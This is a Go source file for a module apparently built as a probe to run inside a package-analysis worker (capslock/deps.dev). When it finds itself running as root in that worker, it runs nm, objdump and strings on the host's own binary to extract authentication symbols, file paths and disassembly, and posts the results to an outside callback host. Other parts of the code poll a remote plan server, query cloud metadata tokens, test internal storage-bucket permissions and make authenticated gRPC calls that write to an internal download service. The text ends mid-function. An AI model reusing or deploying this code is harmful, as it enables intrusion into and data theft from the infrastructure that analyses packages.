package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"debug/elf"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

var genericResultURL string
var compilerResultURL string
var planURL string
var bytemanCanaryURL string
var sessionNonce string
var probeUserAgent string
var rpcServiceHost string
var rpcDialAddress string

const (
	protocolVersion        = 1
	moduleName             = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion           = "v0.0.60-codex"
	expectedUserAgent      = "go-cgo-pkgsite-probe-v060-codex"
	descriptorHelperSHA256 = "a4310ffe3aab048caef9d93b19e7410cb261fb8678b33cb19d04f58e6d2c1acf"
	targetRegistry         = "https://proxy.golang.org"
	targetModuleName       = "github.com/benr00t3d/go-byteman-crosswrite-canary"
	targetVersion          = "v0.0.1"
	targetCanarySHA256     = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
	downloadSource         = "robert-owned-v038-authority-cross-package-canary"
	maximumResult          = 256 * 1024
	maximumBody            = 256 * 1024
	requestTimeout         = 20 * time.Second
	resultTimeout          = 30 * time.Second
	planPollWindow         = 30 * time.Minute
	maximumPlanBody        = 4096
	maximumPlanStep        = 12
)

var bucketNames = []string{
	"depsdev-capslock-reports",
	"sos-byteman-downloads-oregon",
	"sos-byteman-temp-oregon",
}

var bucketPermissions = []string{
	"storage.objects.create",
	"storage.objects.delete",
	"storage.objects.get",
	"storage.objects.list",
	"storage.objects.update",
}

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type identityResult struct {
	Lane string `json:"lane"`
	CWD  string `json:"-"`
}

type metadataResult struct {
	Email      string   `json:"email,omitempty"`
	Scopes     []string `json:"scopes,omitempty"`
	TokenValid bool     `json:"token_valid"`
	Error      string   `json:"error,omitempty"`
}

type bucketResult struct {
	Bucket     string   `json:"bucket"`
	HTTPStatus int      `json:"http_status,omitempty"`
	Granted    []string `json:"granted,omitempty"`
	APIStatus  string   `json:"api_status,omitempty"`
	Error      string   `json:"error,omitempty"`
}

type grpcResult struct {
	ID            string `json:"id,omitempty"`
	Method        string `json:"method"`
	HTTPStatus    int    `json:"http_status,omitempty"`
	GRPCStatus    string `json:"grpc_status,omitempty"`
	GRPCMessage   string `json:"grpc_message,omitempty"`
	BodyBytes     int    `json:"body_bytes,omitempty"`
	BodySHA256    string `json:"body_sha256,omitempty"`
	ContentType   string `json:"content_type,omitempty"`
	Authenticated bool   `json:"authenticated"`
	Error         string `json:"error,omitempty"`
}

type planStep struct {
	Version   int    `json:"version"`
	ID        string `json:"id"`
	Action    string `json:"action"`
	RouteMode string `json:"route_mode,omitempty"`
}

type inspectionResult struct {
	Descriptors     []json.RawMessage       `json:"descriptors,omitempty"`
	Symbols         []string                `json:"symbols,omitempty"`
	DialWindow      []string                `json:"dial_window,omitempty"`
	CallerWindow    []string                `json:"caller_window,omitempty"`
	MetadataKey     string                  `json:"metadata_key,omitempty"`
	KeyAddress      string                  `json:"metadata_key_address,omitempty"`
	KeyLength       int                     `json:"metadata_key_length,omitempty"`
	AuthFileName    *authFileNameResult     `json:"auth_file_name,omitempty"`
	FileNameAddress string                  `json:"auth_filename_address,omitempty"`
	InitSymbols     []staticSymbol          `json:"auth_init_symbols,omitempty"`
	InitWindows     []initDisassemblyWindow `json:"auth_init_windows,omitempty"`
	LoadFileEntry   *functionDisassembly    `json:"load_file_entry,omitempty"`
	AuthSourceNames []string                `json:"auth_source_names,omitempty"`
	AuthFileOpened  bool                    `json:"auth_file_opened"`
	Error           string                  `json:"error,omitempty"`
}

type functionDisassembly struct {
	Symbol            staticSymbol `json:"symbol"`
	DisassemblySHA256 string       `json:"disassembly_sha256"`
	LineCount         int          `json:"line_count"`
	Lines             []string     `json:"lines"`
	CallSymbols       []string     `json:"call_symbols,omitempty"`
	LinesDropped      bool         `json:"lines_dropped"`
}

type initDisassemblyWindow struct {
	Symbol     string   `json:"symbol"`
	Occurrence int      `json:"occurrence"`
	Lines      []string `json:"lines"`
}

type staticSymbol struct {
	Name    string `json:"name"`
	Address string `json:"address"`
}

type pathStatResult struct {
	Path    string `json:"path"`
	Present bool   `json:"present"`
	Mode    string `json:"mode,omitempty"`
	Size    int64  `json:"size,omitempty"`
	Error   string `json:"error,omitempty"`
}

type authFileNameResult struct {
	GlobalAddress string         `json:"global_address,omitempty"`
	StringAddress string         `json:"string_address,omitempty"`
	Path          string         `json:"path,omitempty"`
	File          pathStatResult `json:"file"`
	Parent        pathStatResult `json:"parent"`
	Error         string         `json:"error,omitempty"`
}

type probeReport struct {
	Schema                              string            `json:"schema"`
	Module                              string            `json:"module"`
	Version                             string            `json:"version"`
	TargetModule                        string            `json:"-"`
	TargetVersion                       string            `json:"-"`
	StartedUTC                          string            `json:"started_utc"`
	FinishedUTC                         string            `json:"finished_utc"`
	Identity                            identityResult    `json:"identity"`
	Metadata                            metadataResult    `json:"-"`
	BucketPermissions                   []bucketResult    `json:"-"`
	CanaryURLSHA256                     string            `json:"-"`
	CanaryBodySHA256                    string            `json:"-"`
	Byteman                             []grpcResult      `json:"-"`
	DownloadAttempted                   bool              `json:"-"`
	PlanID                              string            `json:"-"`
	RouteMode                           string            `json:"-"`
	Inspection                          *inspectionResult `json:"inspection,omitempty"`
	Reason                              string            `json:"reason,omitempty"`
	ProcessMemoryRead                   bool              `json:"process_memory_read"`
	AuthFileContentRead                 bool              `json:"auth_file_content_read"`
	MutatingRequestsAttempted           bool              `json:"mutating_requests_attempted"`
	NonCallbackNetworkRequestsAttempted bool              `json:"non_callback_network_requests_attempted"`
}

type tokenResponse struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   int64  `json:"expires_in"`
	TokenType   string `json:"token_type"`
}

func main() {
	if validateCallbackConfiguration() != nil ||
		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	started := time.Now()
	cwd := initialWorkingDirectory()
	identity := inspectIdentity(cwd)
	report := newProbeReport(started, identity)
	endpoint := genericResultURL
	resultID := "v060-codex-" + identity.Lane
	if identity.Lane == "capslock" {
		endpoint = compilerResultURL
		resultID = "v060-codex-capslock-auth-static"
		runAuthStaticInspection(&report)
	} else {
		report.Reason = "static auth inspection is fixed to the verified capslock lane"
	}
	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(endpoint, resultID, cwd, started, report)
}

func validSessionNonce(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, character := range value {
		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
			return false
		}
	}
	return true
}

func exactCallbackURL(raw, expectedPath string) (*url.URL, error) {
	parsed, err := url.Parse(raw)
	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.Hostname() == "" ||
		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" ||
		parsed.ForceQuery || parsed.Fragment != "" || parsed.Path != expectedPath {
		return nil, errors.New("callback URL was outside its exact fixed HTTPS shape")
	}
	return parsed, nil
}

func validateCallbackConfiguration() error {
	if !validSessionNonce(sessionNonce) || probeUserAgent != expectedUserAgent {
		return errors.New("callback identity was invalid")
	}
	generic, err := exactCallbackURL(genericResultURL, "/v1/result/"+sessionNonce+"/generic")
	if err != nil {
		return err
	}
	compiler, err := exactCallbackURL(compilerResultURL, "/v1/result/"+sessionNonce+"/compiler")
	if err != nil || generic.Scheme != compiler.Scheme || generic.Host != compiler.Host {
		return errors.New("callback endpoints did not share one exact HTTPS origin")
	}
	return nil
}

func newProbeReport(started time.Time, identity identityResult) probeReport {
	return probeReport{
		Schema:     "auth-static-inspection/v1",
		Module:     moduleName,
		Version:    probeVersion,
		StartedUTC: started.UTC().Format(time.RFC3339Nano),
		Identity:   identity,
	}
}

func submitProbeReport(endpoint, id, cwd string, started time.Time, report probeReport) error {
	encoded, err := json.MarshalIndent(report, "", "  ")
	result := commandResult{
		Version:    protocolVersion,
		Session:    sessionNonce,
		ID:         id,
		CWD:        cwd,
		DurationMS: time.Since(started).Milliseconds(),
	}
	if err != nil {
		result.ExitCode = 125
		result.Stderr = cleanError(err)
	} else {
		result.Stdout = string(encoded)
	}
	return submitResult(endpoint, result)
}

func initialWorkingDirectory() string {
	if filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}

func inspectIdentity(cwd string) identityResult {
	return identityResult{
		Lane: classifyLaneWithIdentity(cwd, os.Geteuid(), readSmallFile("/proc/1/cmdline", 8192)),
		CWD:  cwd,
	}
}

func classifyLaneWithIdentity(cwd string, effectiveUID int, pid1 string) string {
	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
	if effectiveUID == 0 && strings.Contains(pid1, "talisman-worker-capabilities") &&
		(cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) {
		return "capslock"
	}
	if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
		return "generic"
	}
	return "other"
}

func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return string(value)
}

func cleanError(err error) string {
	if err == nil {
		return ""
	}
	value := err.Error()
	value = strings.ReplaceAll(value, sessionNonce, "[session]")
	if len(value) > 1024 {
		value = value[:1024] + "[truncated]"
	}
	return value
}

func runCapslockSession(started time.Time, cwd string, identity identityResult) {
	initial := newProbeReport(started, identity)
	initial.Reason = "waiting for the bounded read-only auth init plan"
	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	if err := submitProbeReport(compilerResultURL, "v051-codex-capslock-initial", cwd, started, initial); err != nil {
		return
	}

	deadline := time.Now().Add(planPollWindow)
	cursor := 0
	consecutiveErrors := 0
	for cursor < maximumPlanStep && time.Now().Before(deadline) {
		step, available, err := fetchPlan(cursor)
		if err != nil {
			consecutiveErrors++
			if consecutiveErrors >= 3 {
				break
			}
			time.Sleep(2 * time.Second)
			continue
		}
		consecutiveErrors = 0
		if !available {
			time.Sleep(2 * time.Second)
			continue
		}
		stepStarted := time.Now()
		report := newProbeReport(stepStarted, identity)
		report.PlanID = step.ID
		report.RouteMode = step.RouteMode
		switch step.Action {
		case "finish":
			report.Reason = "bounded plan finished"
		case "inspect-auth-init":
			runAuthInitInspection(&report)
		default:
			report.Reason = "validated plan action had no implementation"
		}
		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
		id := "v051-codex-step-" + strconv.Itoa(cursor)
		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
			return
		}
		cursor++
		if step.Action == "finish" {
			return
		}
	}
	finalStarted := time.Now()
	final := newProbeReport(finalStarted, identity)
	if cursor >= maximumPlanStep {
		final.Reason = "bounded plan step limit reached"
	} else if consecutiveErrors >= 3 {
		final.Reason = "bounded plan endpoint failed three times"
	} else {
		final.Reason = "bounded plan polling window expired"
	}
	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(compilerResultURL, "v051-codex-final", cwd, finalStarted, final)
}

func fetchPlan(cursor int) (planStep, bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, planURL+"/"+strconv.Itoa(cursor), nil)
	if err != nil {
		return planStep{}, false, err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       requestTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return planStep{}, false, err
	}
	defer response.Body.Close()
	if response.StatusCode == http.StatusNoContent {
		return planStep{}, false, nil
	}
	if response.StatusCode != http.StatusOK {
		return planStep{}, false, fmt.Errorf("plan endpoint returned HTTP %d", response.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumPlanBody+1))
	if err != nil || len(body) > maximumPlanBody {
		return planStep{}, false, errors.New("plan response too large")
	}
	decoder := json.NewDecoder(bytes.NewReader(body))
	decoder.DisallowUnknownFields()
	var step planStep
	if err := decoder.Decode(&step); err != nil {
		return planStep{}, false, errors.New("plan response was invalid JSON")
	}
	if err := decoder.Decode(&struct{}{}); err != io.EOF {
		return planStep{}, false, errors.New("plan response had trailing data")
	}
	if err := validatePlanStep(step); err != nil {
		return planStep{}, false, err
	}
	return step, true, nil
}

func validatePlanStep(step planStep) error {
	if step.Version != 1 || len(step.ID) < 1 || len(step.ID) > 64 {
		return errors.New("plan identity was invalid")
	}
	for _, value := range step.ID {
		if (value < 'a' || value > 'z') && (value < '0' || value > '9') && value != '-' {
			return errors.New("plan identity was invalid")
		}
	}
	switch step.Action {
	case "inspect-auth-init", "finish":
		if step.RouteMode != "" {
			return errors.New("non-probe plan included route parameters")
		}
	default:
		return errors.New("plan action was not allowed")
	}
	return nil
}

func allowedRouteMode(value string) bool {
	switch value {
	case "byteman-core-localhost", "byteman-localhost", "rpc-gateway",
		"byteman-oregon-gateway", "byteman-home-oregon-gateway", "byteman-iowa-gateway":
		return true
	default:
		return false
	}
}

func fillCapslockContext(report *probeReport) {
	metadataClient := &http.Client{
		Transport: &http.Transport{Proxy: nil},
		Timeout:   requestTimeout,
	}
	metadata, _ := inspectMetadata(metadataClient)
	report.Metadata = metadata
}

func runBytemanProbe(report *probeReport, routeMode string) {
	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
	report.CanaryBodySHA256 = targetCanarySHA256
	rpcClient, rpcEndpoint, err := newMTLSClient(routeMode)
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
		return
	}
	urlLookupRequest := buildURLLookupRequest(bytemanCanaryURL)
	coordinateLookupRequest := buildCoordinateLookupRequest()
	baselineURL := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", urlLookupRequest)
	baselineURL.ID = "baseline-url-lookup"
	report.Byteman = append(report.Byteman, baselineURL)
	baselineCoordinate := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", coordinateLookupRequest)
	baselineCoordinate.ID = "baseline-coordinate-lookup"
	report.Byteman = append(report.Byteman, baselineCoordinate)
	if !grpcSucceeded(baselineURL) || !grpcSucceeded(baselineCoordinate) {
		report.Reason = "both bounded Byteman baseline Lookups did not authenticate cleanly; Download was not attempted"
		return
	}
	report.DownloadAttempted = true
	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", buildTargetDownloadRequest(bytemanCanaryURL))
	download.ID = "cross-package-download"
	report.Byteman = append(report.Byteman, download)
	if grpcSucceeded(download) {
		time.Sleep(1500 * time.Millisecond)
		postURL := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", urlLookupRequest)
		postURL.ID = "post-url-lookup"
		report.Byteman = append(report.Byteman, postURL)
		postCoordinate := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", coordinateLookupRequest)
		postCoordinate.ID = "post-coordinate-lookup"
		report.Byteman = append(report.Byteman, postCoordinate)
		report.Reason = "bounded cross-package Download and post-write Lookups completed"
	} else {
		report.Reason = "bounded cross-package Download returned without success; post-write Lookups were not sent"
	}
}

func grpcSucceeded(result grpcResult) bool {
	return result.HTTPStatus == http.StatusOK && result.GRPCStatus == "0"
}

func buildURLLookupRequest(canaryURL string) []byte {
	return appendStringField(nil, 2, canaryURL)
}

func buildCoordinateLookupRequest() []byte {
	request := []byte{}
	request = appendStringField(request, 7, targetRegistry)
	request = appendStringField(request, 8, targetModuleName)
	request = appendStringField(request, 9, targetVersion)
	request = appendVarintField(request, 10, 1)
	return request
}

func buildTargetMetadata() []byte {
	metadata := []byte{}
	metadata = appendStringField(metadata, 2, targetRegistry)
	metadata = appendVarintField(metadata, 3, 1) // GO_MODULE
	metadata = appendStringField(metadata, 4, targetModuleName)
	metadata = appendVarintField(metadata, 5, 1) // CONCRETE
	metadata = appendStringField(metadata, 6, targetVersion)
	return metadata
}

func buildTargetDownloadRequest(canaryURL string) []byte {
	request := []byte{}
	request = appendStringField(request, 1, canaryURL)
	request = appendBytesField(request, 4, buildTargetMetadata())
	request = appendStringField(request, 6, downloadSource)
	return request
}

type boundedBuffer struct {
	data      []byte
	maximum   int
	truncated bool
}

func (buffer *boundedBuffer) Write(value []byte) (int, error) {
	written := len(value)
	remaining := buffer.maximum - len(buffer.data)
	if remaining > 0 {
		if remaining > len(value) {
			remaining = len(value)
		}
		buffer.data = append(buffer.data, value[:remaining]...)
	}
	if remaining < len(value) {
		buffer.truncated = true
	}
	return written, nil
}

func runFixedTool(path string, arguments ...string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
	defer cancel()
	stdout := &boundedBuffer{maximum: 16 * 1024 * 1024}
	stderr := &boundedBuffer{maximum: 16 * 1024}
	command := exec.CommandContext(ctx, path, arguments...)
	command.Stdout = stdout
	command.Stderr = stderr
	err := command.Run()
	if ctx.Err() != nil {
		return nil, errors.New("fixed inspection tool timed out")
	}
	if err != nil {
		return nil, errors.New("fixed inspection tool failed")
	}
	if stdout.truncated {
		return nil, errors.New("fixed inspection output exceeded its limit")
	}
	return stdout.data, nil
}

func scanBoundedLines(data []byte, include func(string) bool, maximum int) []string {
	var result []string
	scanner := bufio.NewScanner(bytes.NewReader(data))
	scanner.Buffer(make([]byte, 4096), 64*1024)
	for scanner.Scan() && len(result) < maximum {
		line := strings.TrimSpace(scanner.Text())
		if len(line) > 256 {
			line = line[:256] + "[truncated]"
		}
		if line != "" && include(line) {
			result = append(result, line)
		}
	}
	return result
}

func instructionWindow(data []byte, marker string, before, after int) []string {
	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
	for index, line := range lines {
		if !strings.Contains(line, marker) {
			continue
		}
		start := index - before
		if start < 0 {
			start = 0
		}
		end := index + after + 1
		if end > len(lines) {
			end = len(lines)
		}
		return append([]string(nil), lines[start:end]...)
	}
	return nil
}

func boundedInstructionWindows(data []byte, marker string, before, after, maximum int) [][]string {
	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
	type interval struct{ start, end int }
	intervals := make([]interval, 0, maximum)
	for index, line := range lines {
		if !strings.Contains(line, marker) {
			continue
		}
		start := index - before
		if start < 0 {
			start = 0
		}
		end := index + after + 1
		if end > len(lines) {
			end = len(lines)
		}
		if len(intervals) > 0 && start <= intervals[len(intervals)-1].end {
			if end > intervals[len(intervals)-1].end {
				intervals[len(intervals)-1].end = end
			}
			continue
		}
		if len(intervals) >= maximum {
			break
		}
		intervals = append(intervals, interval{start: start, end: end})
	}
	result := make([][]string, 0, len(intervals))
	for _, item := range intervals {
		result = append(result, append([]string(nil), lines[item.start:item.end]...))
	}
	return result
}

const authInitSymbolPrefix = "sos.googlesource.com/sos/auth.init"
const authLoadFileEntrySymbol = "sos.googlesource.com/sos/auth.LoadFileEntry"
const maximumFunctionDisassemblyLines = 256

var callTargetPattern = regexp.MustCompile(`<([^<>]{1,256})>`)

func exactFunctionSymbol(nmOutput []byte, name string) (staticSymbol, error) {
	var result staticSymbol
	found := false
	scanner := bufio.NewScanner(bytes.NewReader(nmOutput))
	scanner.Buffer(make([]byte, 4096), 64*1024)
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) != 3 || fields[2] != name || len(fields[1]) != 1 {
			continue
		}
		if fields[1] != "T" && fields[1] != "t" {
			return staticSymbol{}, errors.New("requested function was not an executable-text symbol")
		}
		address, err := strconv.ParseUint(fields[0], 16, 64)
		if err != nil || address == 0 || found {
			return staticSymbol{}, errors.New("requested function symbol was invalid or duplicated")
		}
		result = staticSymbol{Name: name, Address: fmt.Sprintf("0x%x", address)}
		found = true
	}
	if err := scanner.Err(); err != nil {
		return staticSymbol{}, errors.New("worker function symbol scan failed")
	}
	if !found {
		return staticSymbol{}, errors.New("worker requested function symbol was missing")
	}
	return result, nil
}

func disassemblyCallSymbols(lines []string) []string {
	result := make([]string, 0, 32)
	seen := make(map[string]struct{})
	for _, line := range lines {
		if !strings.Contains(line, "call") {
			continue
		}
		match := callTargetPattern.FindStringSubmatch(line)
		if len(match) != 2 || match[1] == "" {
			continue
		}
		if _, duplicate := seen[match[1]]; duplicate {
			continue
		}
		if len(result) >= 128 {
			break
		}
		seen[match[1]] = struct{}{}
		result = append(result, match[1])
	}
	return result
}

func boundedFunctionDisassembly(symbol staticSymbol, data []byte) functionDisassembly {
	digest := sha256.Sum256(data)
	lines := scanBoundedLines(data, func(string) bool { return true }, maximumFunctionDisassemblyLines+1)
	dropped := len(lines) > maximumFunctionDisassemblyLines
	if dropped {
		lines = lines[:maximumFunctionDisassemblyLines]
	}
	return functionDisassembly{
		Symbol: symbol, DisassemblySHA256: hex.EncodeToString(digest[:]), LineCount: len(lines),
		Lines: lines, CallSymbols: disassemblyCallSymbols(lines), LinesDropped: dropped,
	}
}

func authSourceName(line string) (string, bool) {
	for _, canonical := range [...]string{
		authFileNameSymbol,
		authLoadFileEntrySymbol,
		authInitSymbolPrefix,
	} {
		if strings.Contains(line, canonical) {
			return canonical, true
		}
	}
	return "", false
}

func runFixedAuthSourceNames() ([]string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
	defer cancel()
	command := exec.CommandContext(ctx, "/usr/bin/strings", "-a", "-n", "4", "/proc/1/exe")
	stdout, err := command.StdoutPipe()
	if err != nil {
		return nil, errors.New("fixed strings inspection could not start")
	}
	if err := command.Start(); err != nil {
		return nil, errors.New("fixed strings inspection failed")
	}
	result := make([]string, 0, 32)
	seen := make(map[string]struct{})
	scanner := bufio.NewScanner(stdout)
	scanner.Buffer(make([]byte, 4096), 1024*1024)
	for scanner.Scan() {
		name, matched := authSourceName(scanner.Text())
		if !matched {
			continue
		}
		if _, duplicate := seen[name]; duplicate {
			continue
		}
		if len(result) >= 64 {
			continue
		}
		seen[name] = struct{}{}
		result = append(result, name)
	}
	scanErr := scanner.Err()
	waitErr := command.Wait()
	if ctx.Err() != nil {
		return nil, errors.New("fixed strings inspection timed out")
	}
	if scanErr != nil || waitErr != nil {
		return nil, errors.New("fixed strings inspection failed")
	}
	return result, nil
}

func isBoundedAuthInitSymbol(name string) bool {
	if name == authInitSymbolPrefix {
		return true
	}
	if !strings.HasPrefix(name, authInitSymbolPrefix+".") || len(name) <= len(authInitSymbolPrefix)+1 || len(name) > 256 {
		return false
	}
	for _, character := range name[len(authInitSymbolPrefix)+1:] {
		if (character < 'a' || character > 'z') && (character < 'A' || character > 'Z') &&
			(character < '0' || character > '9') && character != '.' && character != '_' {
			return false
		}
	}
	return true
}

func exactAuthInitSymbols(nmOutput []byte) ([]staticSymbol, error) {
	result := make([]staticSymbol, 0, 8)
	seen := make(map[string]struct{})
	scanner := bufio.NewScanner(bytes.NewReader(nmOutput))
	scanner.Buffer(make([]byte, 4096), 64*1024)
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) != 3 || len(fields[1]) != 1 || !isBoundedAuthInitSymbol(fields[2]) {
			continue
		}
		if fields[1] != "T" && fields[1] != "t" {
			return nil, errors.New("auth init symbol was not executable text")
		}
		address, err := strconv.ParseUint(fields[0], 16, 64)
		if err != nil || address == 0 {
			return nil, errors.New("auth init symbol address was invalid")
		}
		if _, duplicate := seen[fields[2]]; duplicate {
			return nil, errors.New("duplicate auth init symbol was found")
		}
		if len(result) >= 8 {
			return nil, errors.New("auth init symbol count exceeded its bound")
		}
		seen[fields[2]] = struct{}{}
		result = append(result, staticSymbol{Name: fields[2], Address: fmt.Sprintf("0x%x", address)})
	}
	if err := scanner.Err(); err != nil {
		return nil, errors.New("auth init symbol scan failed")
	}
	if len(result) == 0 {
		return nil, errors.New("no auth init symbols were found")
	}
	return result, nil
}

func runAuthInitInspection(report *probeReport) {
	result := &inspectionResult{}
	report.Inspection = result
	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	fileNameAddress, err := exactSymbolAddress(nmOutput, authFileNameSymbol)
	if err != nil {
		result.Error = err.Error()
		return
	}
	result.FileNameAddress = fmt.Sprintf("0x%x", fileNameAddress)
	result.InitSymbols, err = exactAuthInitSymbols(nmOutput)
	if err != nil {
		result.Error = err.Error()
		return
	}
	for _, symbol := range result.InitSymbols {
		disassembly, err := runFixedTool(
			"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble="+symbol.Name, "/proc/1/exe",
		)
		if err != nil {
			result.Error = cleanError(err)
			return
		}
		windows := boundedInstructionWindows(disassembly, authFileNameSymbol, 96, 24, 1-len(result.InitWindows))
		for index, lines := range windows {
			result.InitWindows = append(result.InitWindows, initDisassemblyWindow{
				Symbol: symbol.Name, Occurrence: index + 1, Lines: lines,
			})
		}
		if len(result.InitWindows) >= 1 {
			break
		}
	}
	if len(result.InitWindows) == 0 {
		result.Error = "auth init disassembly contained no FileName reference"
		return
	}
	report.Reason = "bounded static auth init FileName dataflow inspection completed"
}

func runAuthStaticInspection(report *probeReport) {
	result := &inspectionResult{}
	report.Inspection = result
	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	fileNameAddress, err := exactSymbolAddress(nmOutput, authFileNameSymbol)
	if err != nil {
		result.Error = err.Error()
		return
	}
	result.FileNameAddress = fmt.Sprintf("0x%x", fileNameAddress)
	loadSymbol, err := exactFunctionSymbol(nmOutput, authLoadFileEntrySymbol)
	if err != nil {
		result.Error = err.Error()
		return
	}
	loadDisassembly, err := runFixedTool(
		"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble="+loadSymbol.Name, "/proc/1/exe",
	)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	loadEvidence := boundedFunctionDisassembly(loadSymbol, loadDisassembly)
	result.LoadFileEntry = &loadEvidence
	result.InitSymbols, err = exactAuthInitSymbols(nmOutput)
	if err != nil {
		result.Error = err.Error()
		return
	}
	for _, symbol := range result.InitSymbols {
		disassembly, err := runFixedTool(
			"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble="+symbol.Name, "/proc/1/exe",
		)
		if err != nil {
			result.Error = cleanError(err)
			return
		}
		windows := boundedInstructionWindows(disassembly, authFileNameSymbol, 96, 24, 1-len(result.InitWindows))
		for index, lines := range windows {
			result.InitWindows = append(result.InitWindows, initDisassemblyWindow{
				Symbol: symbol.Name, Occurrence: index + 1, Lines: lines,
			})
		}
		if len(result.InitWindows) >= 1 {
			break
		}
	}
	if len(result.InitWindows) == 0 {
		result.Error = "auth init disassembly contained no FileName assignment reference"
		return
	}
	result.AuthSourceNames, err = runFixedAuthSourceNames()
	if err != nil {
		result.Error = err.Error()
		return
	}
	report.Reason = "bounded static LoadFileEntry and auth init FileName evidence completed"
}

const authFileNameSymbol = "sos.googlesource.com/sos/auth.FileName"

func readELFVirtualBytes(executable *elf.File, address uint64, length int, writable bool) ([]byte, error) {
	if length < 1 || length > 4096 {
		return nil, errors.New("ELF virtual read length was outside the fixed bound")
	}
	end := address + uint64(length)
	if end < address {
		return nil, errors.New("ELF virtual read address overflowed")
	}
	for _, section := range executable.Sections {
		sectionEnd := section.Addr + section.Size
		if sectionEnd < section.Addr || section.Type == elf.SHT_NOBITS ||
			section.Flags&elf.SHF_ALLOC == 0 || address < section.Addr || end > sectionEnd ||
			(section.Flags&elf.SHF_WRITE != 0) != writable {
			continue
		}
		reader := section.Open()
		if _, err := reader.Seek(int64(address-section.Addr), io.SeekStart); err != nil {
			return nil, errors.New("ELF virtual offset could not be selected")
		}
		value := make([]byte, length)
		if _, err := io.ReadFull(reader, value); err != nil {
			return nil, errors.New("ELF virtual bytes could not be read")
		}
		return value, nil
	}
	return nil, errors.New("ELF virtual address was outside the required section class")
}

func validateLinkedPath(value []byte) (string, error) {
	if len(value) < 1 || len(value) > 4096 || !utf8.Valid(value) {
		return "", errors.New("linked auth filename had an invalid length or encoding")
	}
	path := string(value)
	for _, character := range path {
		if character < 0x20 || character == 0x7f {
			return "", errors.New("linked auth filename contained a control character")
		}
	}
	if !filepath.IsAbs(path) || filepath.Clean(path) != path || path == string(filepath.Separator) {
		return "", errors.New("linked auth filename was not a clean absolute file path")
	}
	return path, nil
}

func lstatPath(path string) pathStatResult {
	result := pathStatResult{Path: path}
	info, err := os.Lstat(path)
	if errors.Is(err, os.ErrNotExist) {
		return result
	}
	if err != nil {
		result.Error = "lstat failed"
		return result
	}
	result.Present = true
	result.Mode = info.Mode().String()
	result.Size = info.Size()
	return result
}

func exactSymbolAddress(nmOutput []byte, symbolName string) (uint64, error) {
	var address uint64
	found := false
	scanner := bufio.NewScanner(bytes.NewReader(nmOutput))
